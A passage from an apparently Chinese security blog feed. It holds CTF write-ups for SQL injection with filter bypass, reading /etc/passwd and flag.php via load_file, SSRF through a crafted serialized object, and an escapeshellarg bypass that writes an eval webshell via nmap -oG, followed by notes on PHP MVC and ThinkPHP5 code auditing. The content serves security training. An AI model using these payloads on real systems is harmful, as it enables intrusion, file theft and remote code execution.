class="hljs-string">&#x27;5&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;order clause&#x27;</span>)——<span class="hljs-number">4</span>列/<span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">1</span>%<span class="hljs-number">27</span><span class="hljs-keyword">union</span>%<span class="hljs-number">20</span><span class="hljs-keyword">select</span>%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>%<span class="hljs-number">23</span>  //<span class="hljs-keyword">no</span> hack ~_~/<span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">1</span>^updatexml   //[*] query error! (<span class="hljs-type">Unknown</span> <span class="hljs-keyword">column</span> <span class="hljs-string">&#x27;updatexml&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;where clause&#x27;</span>)/<span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">1</span>^<span class="hljs-keyword">if</span>(length((<span class="hljs-keyword">select</span>(flag)<span class="hljs-keyword">from</span>(information_schema.schemata)))=<span class="hljs-number">42</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)  //[*] query error! (<span class="hljs-type">Unknown</span> <span class="hljs-keyword">column</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;field list&#x27;</span>)   //information_schema.schemata 所有库名/<span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">1</span>^<span class="hljs-keyword">if</span>(length((<span class="hljs-keyword">select</span>(passwd)<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">tables</span>)))=<span class="hljs-number">42</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)//information_schema.<span class="hljs-keyword">tables</span>：所有表集合，<span class="hljs-number">1</span>^<span class="hljs-keyword">if</span>(length((<span class="hljs-keyword">select</span>(passwd)<span class="hljs-keyword">from</span>(users)))=<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)，爆出<span class="hljs-keyword">password</span>长度：<span class="hljs-number">128</span>   //太麻烦了，卡壳，不知道咋读表、列名了</code></pre><ol start="5" type="1"><li>查看WP发现unionselect被过滤，而且只对他俩中间得空格过滤——==中间加/**/即可绕过==</li></ol><pre><code class="hljs crystal"> ?no=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1,<span class="hljs-title">user</span>(),3,4--+　　　　//数据库信息</span>root@localhost  ==》root权限，可以sql读文件</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313144801377.png" alt="image-20220313144801377" style="zoom: 50%;"></p><h4 id="法1sql注入root直接读本地文件">法1：SQL注入root直接读本地文件</h4><p>secure-file-priv是一个系统变量，对于文件读/写功能进行限制。具体如下：</p><ul><li><p>无内容，表示无限制。</p></li><li><p>为NULL，表示禁止文件读/写。</p></li><li><p>为目录名，表示仅允许对特定目录的文件进行读/写。</p></li><li><p>三种方法查看当前<code>secure-file-priv</code>的值：</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> @@secure_file_priv;<span class="hljs-keyword">select</span> @@global.secure_file_priv;<span class="hljs-keyword">show</span> <span class="hljs-keyword">variables</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&quot;secure_file_priv&quot;</span>;</code></pre></li></ul><p>读文件：</p><ul><li><p>Mysql读取文件通常使用load_file函数，语法如下：【==限制：secure-file-priv无值（root）、绝对路径、文件必须在服务器上==】</p></li><li><p>``` select load_file(file_path); <pre><code class="hljs sql">- ```  <span class="hljs-keyword">load</span> <span class="hljs-keyword">data</span> <span class="hljs-keyword">infile</span> <span class="hljs-string">&quot;/etc/passwd&quot;</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">test</span> <span class="hljs-keyword">FIELDS</span> <span class="hljs-keyword">TERMINATED</span> <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;\n&#x27;</span>; <span class="hljs-comment">#读取服务端文件</span></code></pre></p></li></ul><pre><code class="hljs crystal">-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1,@@<span class="hljs-title">secure_file_priv</span>,3,4--+    //回显空--说明无限制</span>/view.php?no=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1,<span class="hljs-title">load_file</span>(&#x27;/<span class="hljs-title">etc</span>/<span class="hljs-title">passwd</span>&#x27;),3,4--+   成功读到系统文件</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313145336505.png" alt="image-20220313145336505"></p><p>payload：==注意！flag在源码==</p><pre><code class="hljs crystal">view.php?no=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1,<span class="hljs-title">load_file</span>(&#x27;/<span class="hljs-title">var</span>/<span class="hljs-title">www</span>/<span class="hljs-title">html</span>/<span class="hljs-title">flag</span>.<span class="hljs-title">php</span>&#x27;),3,4--+</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313145628120.png" alt="image-20220313145628120"></p><h4 id="法2反序列化ssrf读本地文件">法2：反序列化+SSRF读本地文件</h4><p>继续注入，已知表是facebook</p><p>爆当前库下所有表名：</p><pre><code class="hljs pgsql"><span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>(),<span class="hljs-number">3</span>,<span class="hljs-number">4</span><span class="hljs-comment">--+   错！，回显位置在中间时，from应该在select所有的后面</span><span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">--+   //users表</span></code></pre><p>爆users表列名：</p><pre><code class="hljs pgsql"><span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span><span class="hljs-comment">--+</span><span class="hljs-keyword">no</span>,username,passwd,data,<span class="hljs-keyword">USER</span>,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</code></pre><p>爆字段：</p><pre><code class="hljs crystal">view.php?no=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1,<span class="hljs-title">concat_ws</span>(&#x27;--&#x27;,<span class="hljs-title">no</span>,<span class="hljs-title">username</span>,<span class="hljs-title">passwd</span>,<span class="hljs-title">data</span>),3,4 <span class="hljs-title">from</span> <span class="hljs-title">users</span>--+</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313150748223.png" alt="image-20220313150748223"></p><ul><li>然后注意注入时一直都有的报错，大概意思是unserialize没有读取到参数</li></ul><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313151150653.png" alt="image-20220313151150653"></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313151308157.png" alt="image-20220313151308157"></p><ul><li>这个data就是序列化后的字符串，与一开始得到的源码有关联了，<strong>因为页面提示了我们反序列化，所以猜测no参数的值代入数据库查询之后还会被反序列化一次，这个时候就会导致blog变异，读任意文件</strong></li></ul><p>尝试把序列化字符传入不同位置，发现在4的位置成功读取序列化字符串，并反序列化返回www.baidu.com的base64内容</p><p>构造payload读取flag:</p><pre><code class="hljs css">一开始：<span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:8</span><span class="hljs-selector-pseudo">:&quot;UserInfo&quot;</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;abc&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">11</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">21</span>:<span class="hljs-string">&quot;https://www.baidu.com&quot;</span>;&#125;构造：<span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:8</span><span class="hljs-selector-pseudo">:&quot;UserInfo&quot;</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;abc&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">11</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;</code></pre><p>成功读到base64，解码得到flag</p><h2 id="buuctf-2018online-tool">[BUUCTF 2018]Online Tool</h2><p>考点：escapeshellarg()和escapeshellcmd()这个点，外加一个nmap的文件写入。</p><blockquote><p><a href="https://blog.csdn.net/qq_26406447/article/details/100711933">参考WP1</a></p><p><a href="https://blog.csdn.net/qq_52907838/article/details/119115412?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.pc_relevant_default&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=1">参考WP2</a></p></blockquote><p>点进去得到源码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_SERVER[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;    $_SERVER[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = $_SERVER[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];&#125;<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;host&#x27;</span>])) &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125; <span class="hljs-keyword">else</span> &#123;    $host = $_GET[<span class="hljs-string">&#x27;host&#x27;</span>];    $host = escapeshellarg($host);  <span class="hljs-comment">//对参数host过滤了</span>    $host = escapeshellcmd($host);    $sandbox = md5(<span class="hljs-string">&quot;glzjin&quot;</span>. $_SERVER[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you are in sandbox &#x27;</span>.$sandbox;    @mkdir($sandbox);    chdir($sandbox);    <span class="hljs-keyword">echo</span> system(<span class="hljs-string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);&#125;</code></pre><p>REMOTE_ADDR不能伪造，然后这里也不能产生影响</p><p><strong>escapeshellarg</strong>本以为是自定义函数，但发现不是，是官方函数，防注入的，但可以绕过</p><blockquote><p><strong>应用使用</strong><code>escapeshellarg -&gt; escapeshellcmd</code><strong>这样的流程来处理输入是存在隐患的</strong></p></blockquote><pre><code class="hljs lsl"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>&#x27; -v -d a=<span class="hljs-number">1</span>经过escapeshellarg()函数处理后变为： &#x27;<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>&#x27;\&#x27;&#x27; -v -d a=<span class="hljs-number">1</span>&#x27;也就是将其中的&#x27;单引号转义，再将左右两部分用单引号括起来从而起到连接的作用，这样左右就形成闭合，命令就被当作简单的字符串。接着经过escapeshellcmd()函数处理后变成：&#x27;<span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>&#x27;\\&#x27;&#x27; -v -d a=<span class="hljs-number">1</span>\&#x27;也就是说对\以及最后那个不配对儿的引号进行了转义执行的命令是curl &#x27;<span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>&#x27;\\&#x27;&#x27; -v -d a=<span class="hljs-number">1</span>\&#x27;，由于中间的\\被解释为\而不再是转义字符，所以后面的&#x27;没有被转义，与再后面的&#x27;配对儿成了一个空白连接符。所以可以简化为curl <span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>\ -v -d a=<span class="hljs-number">1</span>&#x27;，即向<span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>\发起请求，POST 数据为a=<span class="hljs-number">1</span>&#x27;。</code></pre><h4 id="namp写webshell">namp写webshell</h4><p>其中参数<span style="background:#FF9999;"><code>-oG</code>可以实现将命令和结果写入文件，其格式为：内容-oG 文件名称</span></p><pre><code class="hljs diff">Nmap的一些参数：<span class="hljs-deletion">-oN 标准保存</span><span class="hljs-deletion">-oX XML保存</span><span class="hljs-deletion">-oG Grep保存</span><span class="hljs-deletion">-oA 保存到所有格式</span><span class="hljs-deletion">-append-output 补充保存文件</span></code></pre><p>构造</p><pre><code class="hljs php"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> | <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[hack]);<span class="hljs-meta">?&gt;</span> -oG shell.php</code></pre><p>但这样会被escapeshellarg()与escapeshellcmd()函数处理为：</p><pre><code class="hljs taggerscript">&#x27;127.0.0.1 | <span class="hljs-symbol">\&lt;</span><span class="hljs-symbol">\?</span>php @eval<span class="hljs-symbol">\(</span><span class="hljs-symbol">\)</span><span class="hljs-symbol">\;</span><span class="hljs-symbol">\?</span><span class="hljs-symbol">\&gt;</span> -oG hack.php&#x27;</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF,比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网站架构知识点</title>
    <link href="/2021/11/25/%E7%BD%91%E7%AB%99%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2021/11/25/%E7%BD%91%E7%AB%99%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="参考">参考</h2><ul><li><p>mvc</p><ul><li><a href="https://www.cnblogs.com/wsybky/p/8638876.html">🔗博客园</a>、详解：https://www.awaimai.com/128.html</li></ul></li><li><p>笔记，https://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&amp;mid=2247484899&amp;idx=1&amp;sn=88695ccf7c57ea43f45ae6dc6464de6d&amp;chksm=cfd87a1cf8aff30a2fe6812b27f19e07e4cedcdd08cef51720a0431f08f22e5f4fd896c15579&amp;scene=178&amp;cur_album_id=2058889256642707457#rd</p></li><li><p>mac cms https://www.cnblogs.com/ichunqiu/p/9548754.html</p></li></ul><h2 id="知识点">知识点📂</h2><ul><li><p>MVC</p><ul><li><p>关键字</p><ul><li><p>搜索漏洞关键字</p></li><li><p>但是注意对方可能自己写函数封装</p></li></ul></li><li><p>定点挖掘功能点</p><ul><li>从功能点出发，找功能点对应代码段，进行代码分析</li></ul></li><li><p>断点测试</p><ul><li>对访问页面进行断点测试——》执行过程前后顺序，对应的文件列表。。</li></ul></li></ul></li><li><p>攻击⚔</p><ul><li><p>seay代码审计</p></li><li><p>sql注入，搜索SELECT，有变量才有漏洞！，无变量就是写死的</p></li><li><p>魔术引号绕过</p><ul><li><p>宽字节注入，二次注入（存进的数据是加上，使用数据【修改资料update】的时候产生注入）</p></li><li><p>二次注入，找功能点，注册用户一类的</p></li></ul></li><li><p>文件上传</p><ul><li><p>直接检查后缀比mime靠谱</p></li><li><p>xdebug断点调试能细分到各个php，而burp抓不到，它只抓网页请求，不管内部调用</p></li><li><p>对先上传后验证的--》有漏洞，抓包改后缀即可上传php</p></li></ul></li><li><p>mvc与thinkphp</p><ul><li>一个是思想，一个基于此</li></ul></li><li><p>文件删除</p><ul><li><p>install.lock或访问install.lock.txt会提示重新安装，重新安装=》初始化</p></li><li><p>对应函数unlink</p></li></ul></li><li><p>RCE</p><ul><li>eval,</li></ul></li><li><p>Metinfo-无框架-变量覆盖-自动审计或搜索</p></li><li><p>用seay工具审计，双$$可能存在变量覆盖漏洞</p></li><li><p>重点看配置文件：inc</p></li><li><p>前端显示界面可能并不是index.php而是在default【模块文件夹】以某个文件如index.html被index.php包含，修改这个index.html前端就有变化</p></li><li><p>变量名=【get/post/cookie】参数名时，实现变量覆盖，$request==a$<span class="math inline">\(request==\)</span>a<img src="https://api2.mubu.com/v3/document_image/17bc0b1a-e51b-4f53-9a90-320efe4616c7-11812322.jpg" alt="img"></p></li><li><p>配合文件包含进行攻击，控制$file进行攻击，上传图片马，file指向图片马√<img src="https://api2.mubu.com/v3/document_image/77de218a-c646-4601-98b3-d34cb43f24e7-11812322.jpg" alt="img"></p></li><li><p>包含漏洞条件</p><ul><li><p>需要有包含函数+包含的是变量【可控】，而不是固定的字符串【不能更改】</p></li><li><p>满足用到了（包含了）那个变量覆盖的配置文件</p><ul><li>1包含2，2包含3 可以说 1包含3</li></ul></li></ul></li><li><p>变量覆盖还可以和sql注入搭配使用</p></li><li><p>phpmydmin-无框架-反序列化-自动审计或搜索</p><ul><li><p>phpmyadmin插件==》管理自己的数据库</p></li><li></li></ul></li><li><p>TP5知识点</p><ul><li><p>入口文件：即访问网站的文件（首页文件 ）：application.php</p><ul><li>但这是对应的功能文件，若是找美观/页面==》view下对应的html</li></ul></li><li><p>对应用的所有请求都定向到应用的入口文件<img src="https://api2.mubu.com/v3/document_image/f92d82e7-e191-458c-84c3-13f51e0dff50-11812322.jpg" alt="img"></p></li><li><p>模块：application目录下的，控制器：controller下的，操作==函数（controller下的文件里的函数）、<img src="https://api2.mubu.com/v3/document_image/ba9f2e3a-283f-4623-b7d6-0389278517f0-11812322.jpg" alt="img"></p></li><li><p>如何访问参数？</p><ul><li>xiaodi/i/1或者？i=1<img src="https://api2.mubu.com/v3/document_image/9d390437-e246-4169-8249-d19c66699f3a-11812322.jpg" alt="img"></li></ul></li><li><p>TP5 自带的mysql写法有过滤，内置安全 ==》【TP 历史漏洞 绕过过滤】</p></li><li><p>一般入口文件/index.php/可加可不加</p><ul><li>入口文件在public/index.php</li></ul></li><li><p>tp5手册</p></li></ul></li></ul></li><li><p>包含：include==代码包含进去，把任意代码当成php执行，可以任意格式文件</p><ul><li>无需eval（include）,include就能执行包含文件的代码</li></ul></li></ul><h3 id="mvc框架">MVC框架</h3><blockquote><p><a href="https://www.cnblogs.com/wsybky/p/8638876.html">博客园</a></p></blockquote><h4 id="mvc各部分的职能">MVC各部分的职能：</h4><ul><li>模型Model –管理大部分的业务逻辑和所有的数据库逻辑。模型提供了连接和操作数据库的抽象层。</li><li>控制器Controller -负责响应用户请求、准备数据，以及决定如何展示数据。</li><li>视图View – 负责渲染数据，通过HTML方式呈现给用户。</li></ul><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/web_mvc.gif" alt="MVC流程图"></p><p>一个典型的Web MVC流程：</p><ol type="1"><li>Controller截获用户发出的请求；</li><li>Controller调用Model完成状态的读写操作；</li><li>Controller把数据传递给View；</li><li>View渲染最终结果并呈献给用户。</li></ol><p><strong>大致总结：controller根据请求调用model数据用view呈现出来</strong></p><h4 id="mvc框架目录结构">MVC框架目录结构</h4><pre><code class="hljs awk">project                 WEB部署根目录├─app                   应用目录│  ├─controllers        控制器目录│  ├─models             模块目录│  ├─views              视图目录   <span class="hljs-regexp">//</span>例如页头页脚文件+各种要显示功能的文件├─config                配置文件目录  <span class="hljs-regexp">//</span>数据库连接参数├─fastphp               框架核心目录│ ├─base                MVC基类/模板目录，数据库增删修改模板在此\db\sql.php│ ├─db                  数据库操作类目录│ ├─Fastphp.php         内核文件  <span class="hljs-regexp">//</span>规定了路由├─static                静态文件目录├─index.php             入口文件</code></pre><h4 id="mvc核心文件">MVC核心文件</h4><h5 id="入口文件index.php">入口文件index.php</h5><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// 应用目录为当前目录</span>define(<span class="hljs-string">&#x27;APP_PATH&#x27;</span>, <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/&#x27;</span>);<span class="hljs-comment">// 开启调试模式</span>define(<span class="hljs-string">&#x27;APP_DEBUG&#x27;</span>, <span class="hljs-literal">true</span>);<span class="hljs-comment">// 加载框架文件</span><span class="hljs-keyword">require</span>(APP_PATH . <span class="hljs-string">&#x27;fastphp/Fastphp.php&#x27;</span>);<span class="hljs-comment">// 加载配置文件</span>$config = <span class="hljs-keyword">require</span>(APP_PATH . <span class="hljs-string">&#x27;config/config.php&#x27;</span>);<span class="hljs-comment">// 实例化框架类</span>(<span class="hljs-keyword">new</span> fastphp\Fastphp($config))-&gt;run();</code></pre><p><code>DIR</code> 是PHP的魔术常量，表示当前目录的绝对路径</p><h5 id="配置文件config.php">配置文件config.php</h5><p><strong>作用是定义数据库连接参数参数，以及配置默认控制器名和操作名：</strong></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// 数据库配置</span>$config[<span class="hljs-string">&#x27;db&#x27;</span>][<span class="hljs-string">&#x27;host&#x27;</span>] = <span class="hljs-string">&#x27;localhost&#x27;</span>;$config[<span class="hljs-string">&#x27;db&#x27;</span>][<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;$config[<span class="hljs-string">&#x27;db&#x27;</span>][<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-string">&#x27;123456&#x27;</span>;$config[<span class="hljs-string">&#x27;db&#x27;</span>][<span class="hljs-string">&#x27;dbname&#x27;</span>] = <span class="hljs-string">&#x27;project&#x27;</span>;<span class="hljs-comment">// 默认控制器和操作名</span>$config[<span class="hljs-string">&#x27;defaultController&#x27;</span>] = <span class="hljs-string">&#x27;Item&#x27;</span>;$config[<span class="hljs-string">&#x27;defaultAction&#x27;</span>] = <span class="hljs-string">&#x27;index&#x27;</span>;<span class="hljs-keyword">return</span> $config;</code></pre><h5 id="核心框架文件fastphp.php">核心框架文件fastphp.php</h5><p>核心代码：路由方法：</p><pre><code class="hljs php"><span class="hljs-comment">// 路由处理</span>   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">route</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">   </span>&#123;       $controllerName = <span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;defaultController&#x27;</span>];       $actionName = <span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;defaultAction&#x27;</span>];       $param = <span class="hljs-keyword">array</span>();       $url = $_SERVER[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>];       <span class="hljs-comment">// 清除?之后的内容</span>       $position = strpos($url, <span class="hljs-string">&#x27;?&#x27;</span>);       $url = $position === <span class="hljs-literal">false</span> ? $url : substr($url, <span class="hljs-number">0</span>, $position);       <span class="hljs-comment">// 删除前后的“/”</span>       $url = trim($url, <span class="hljs-string">&#x27;/&#x27;</span>);       <span class="hljs-keyword">if</span> ($url) &#123;           <span class="hljs-comment">// 使用“/”分割字符串，并保存在数组中</span>           $urlArray = explode(<span class="hljs-string">&#x27;/&#x27;</span>, $url);           <span class="hljs-comment">// 删除空的数组元素</span>           $urlArray = array_filter($urlArray);                      <span class="hljs-comment">// 获取控制器名</span>           $controllerName = ucfirst($urlArray[<span class="hljs-number">0</span>]);                      <span class="hljs-comment">// 获取动作名</span>           array_shift($urlArray);           $actionName = $urlArray ? $urlArray[<span class="hljs-number">0</span>] : $actionName;                      <span class="hljs-comment">// 获取URL参数</span>           array_shift($urlArray);           $param = $urlArray ? $urlArray : <span class="hljs-keyword">array</span>();       &#125;       <span class="hljs-comment">// 判断控制器和操作是否存在</span>       $controller = <span class="hljs-string">&#x27;app\\controllers\\&#x27;</span>. $controllerName . <span class="hljs-string">&#x27;Controller&#x27;</span>;       <span class="hljs-keyword">if</span> (!class_exists($controller)) &#123;           <span class="hljs-keyword">exit</span>($controller . <span class="hljs-string">&#x27;控制器不存在&#x27;</span>);       &#125;       <span class="hljs-keyword">if</span> (!method_exists($controller, $actionName)) &#123;           <span class="hljs-keyword">exit</span>($actionName . <span class="hljs-string">&#x27;方法不存在&#x27;</span>);       &#125;       <span class="hljs-comment">// 如果控制器和操作名存在，则实例化控制器，因为控制器对象里面</span>       <span class="hljs-comment">// 还会用到控制器名和操作名，所以实例化的时候把他们俩的名称也</span>       <span class="hljs-comment">// 传进去。结合Controller基类一起看</span>       $dispatch = <span class="hljs-keyword">new</span> $controller($controllerName, $actionName);       <span class="hljs-comment">// $dispatch保存控制器实例化后的对象，我们就可以调用它的方法，</span>       <span class="hljs-comment">// 也可以像方法中传入参数，以下等同于：$dispatch-&gt;$actionName($param)</span>       call_user_func_array(<span class="hljs-keyword">array</span>($dispatch, $actionName), $param);   &#125;</code></pre><h6 id="命名空间">命名空间</h6><p>php文件开头的 <code>namespace AA;</code></p><ul><li>命名空间https://blog.csdn.net/zhanghuiqi205/article/details/84671608?utm_source=app&amp;app_version=4.17.0，其实就是对不同文件各种起名（函数名，对象名）的一块地方汇总，避免不知道哪个是哪个文件的</li><li>命名空间也有根目录，没有命名空间的默认根目录下</li><li>空间名我们可以任意的定义，但是如果命名更有意义呢？一般我们会以==类文件所在的文件夹为空间名==。其实主要的就是方便按照某种约定成俗的规则加载文件。==tp5规范命名空间其实对应了文件的所在目录==</li></ul><h6 id="路由方法">路由方法</h6><p><strong>主要作用：截取URL，并解析出控制器名、方法名和URL参数。</strong></p><p>假设我们的 URL 是这样：</p><pre><code class="hljs awk">yoursite.com<span class="hljs-regexp">/controllerName/</span>actionName/queryString</code></pre><p>当浏览器访问上面的URL，<code>route()</code>从全局变量<code>$_SERVER['REQUEST_URI']</code>中获取到字符串<code>/controllerName/actionName/queryString</code>。</p><p>然后，会将这个字符串分割成三部分：<code>controllerName</code>、<code>actionName</code>和 <code>queryString</code>。</p><p>例如，URL链接为：yoursite.com/item/detail/1/hello，那么<code>route()</code>分割之后，</p><ul><li>ControllerName名就是：item</li><li>actionName名就是：detail</li><li>URL参数就是：array(1, hello)</li></ul><p>分割完成后，路由方法再实例化控制器：<code>itemController</code>，并调用其中的<code>detail</code>方法。</p><h3 id="tp5">TP5</h3><blockquote><p><a href="https://www.shouce.ren/api/view/a/15517">在线TP5完全手册</a></p><p><a href="https://www.kancloud.cn/thinkphp/thinkphp5_quickstart/145249">快速入门</a></p></blockquote><p>==注意！默认情况下，URL地址中的控制器和操作名是不区分大小写的，因此下面的访问其实是等效的：/index/与/INDEX/==</p><p>目录结构</p><pre><code class="hljs ruby"><span class="hljs-params">|-application 应用目录（代码的主要编写区，几乎整个项目的内容都写在这里）</span><span class="hljs-params">    |</span>-index（这里的文件夹tp5叫做模块-----一般是前台模块，也可以根据需要需求修改成其他（例如：home），需要修改配置文件，修改默认模块、控制器、操作）  【注】：TP5默认只有一个index文件（模块）和一个控制层（conrroller），我们在写代码的时候会自己新建一个model和view,这样就组成了这个Index模块儿的MVC(controller控制层，model模型层，view视图层),如需后台(一般来说都需要)，则需要新建一个后台模块(admin)        <span class="hljs-params">|-controller(控制层)</span><span class="hljs-params">        |</span>-model(模型层)        <span class="hljs-params">|-view(视图层)</span><span class="hljs-params">    |</span>-admin(后台模块)        <span class="hljs-params">|-controller(控制层)</span><span class="hljs-params">        |</span>-model(模型层)        <span class="hljs-params">|-view(视图层)</span><span class="hljs-params">    |</span>- command.php 是控制台的配置文件，当我们用命令行执行thinkphp的时候，它会读取command.php的配置    <span class="hljs-params">|- common.php 它是项目的公共文件，当我们编写一些通用函数的时候，比如我们写一个函数，想在所有的模块儿中都能调用，那么我们就可以把函数写在改文件中，它就可以注册到全局，在任何地方都可以调用</span><span class="hljs-params">    |</span>- config.php 它是应用的配置文件，整个应用都读取这个配置，也就是admin模块儿和index模块儿会通用这个配置    <span class="hljs-params">|- database.php 它是数据库配置文件，如果我们需要连接数据库，那么我们只需要修改database.php的配置就可以了</span><span class="hljs-params">    |</span>- route.php 